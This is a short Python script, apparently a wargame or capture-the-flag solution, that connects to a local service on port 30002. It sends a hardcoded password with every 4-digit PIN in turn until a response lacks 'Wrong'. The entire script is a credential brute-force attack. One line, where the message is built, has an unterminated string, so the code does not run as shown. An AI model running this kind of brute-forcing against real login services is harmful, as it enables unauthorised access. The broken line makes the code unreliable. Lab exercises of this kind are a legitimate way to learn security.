#!/usr/bin/python3

import socket
import re

adresseIP="127.0.0.1"
port = 30002

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client.connect((adresseIP, port))

client.send("UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001".encode("utf-8"))
reponse = client.recv(255)
print(reponse.decode("utf-8"))

for a in range(0,10):
    for b in range(0,10):
        for c in range(0,10):
            for d in range(0,10):
                digicode = str(a)+str(b)+str(c)+str(d)
                message = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ " + digicode + " \n
                client.send(message.encode("utf-8"))
                reponse = client.recv(255)
                if (re.search("Wrong", reponse.decode("utf-8")))== None:
                    print(reponse.decode("utf-8"))
client.close()
